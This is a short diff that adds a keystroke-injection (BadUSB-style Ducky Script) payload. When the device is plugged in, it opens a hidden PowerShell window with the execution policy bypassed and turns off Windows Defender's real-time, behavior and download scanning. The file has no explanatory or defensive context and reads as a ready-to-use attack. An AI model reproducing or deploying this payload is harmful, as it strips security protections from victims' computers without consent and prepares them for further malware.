@@ -1,0 +1,15 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Disable antivirus
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableIOAVProtection $true
+ENTER
